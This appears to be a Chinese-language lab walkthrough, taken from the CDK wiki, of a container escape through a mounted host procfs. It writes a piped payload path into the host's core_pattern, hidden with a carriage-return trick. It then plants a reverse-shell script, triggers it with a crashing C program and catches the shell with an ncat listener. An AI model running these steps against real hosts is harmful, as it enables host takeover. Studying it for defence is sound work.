# mount procfs
From: https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs

Also: https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs
## Description
procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件，因此将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认情况下不会为容器开启User Namespace)，一般来说我们不会将宿主机的procfs挂载到容器中，然而有些业务为了实现某些特殊需要，还是会将该文件系统挂载进来，procfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式，从2.6.19内核版本开始Linux支持在/proc/sys/kernel/core_pattern中使用新语法，如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行.

## Usage

使用metarget构建环境

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
./metarget cnv install mount-host-procfs
```
利用:

```bash
kubectl exec -it -n metarget mount-host-procfs /bin/bash
```

在容器中，首先拿到当前容器在宿主机上的绝对路径：
```
root@mount-host-procfs:/# cat /proc/mounts | grep docker
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/SDXPXVSYNB3RPWJYHAD5RIIIMO:/var/lib/docker/overlay2/l/QJFV62VKQFBRS5T5ZW4SEMZQC6:/var/lib/docker/overlay2/l/SSCMLZUT23WUSPXAOVLGLRRP7W:/var/lib/docker/overlay2/l/IBTHKEVQBPDIYMRIVBSVOE2A6Y:/var/lib/docker/overlay2/l/YYE5TPGYGPOWDNU7KP3JEWWSQM,upperdir=/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/diff,workdir=/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/work 0 0
```
从workdir可以得到基础路径，结合背景知识可知当前容器在宿主机上的merged目录绝对路径如下：`/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged`

向容器内`/host-proc/sys/kernel/core_pattern`内写入以下内容：
```shell
echo -e "|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \rcore           " > /host-proc/sys/kernel/core_pattern
```
然后在容器内创建一个反弹shell的`/tmp/.x.py`,**注意需要写入攻击者的IP**：
```shell
chmod +x /tmp/.x.py
```
最后，在容器内运行一个可以崩溃的程序即可，例如：

```c
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}
```
容器内若没有编译器，可以先在其他机器上编译好后放入容器中。

完成后，在其他机器上开启shell监听：
```
ncat -lvnp 10000
```
接着在容器内执行上述编译好的崩溃程序，即可获得反弹shell。
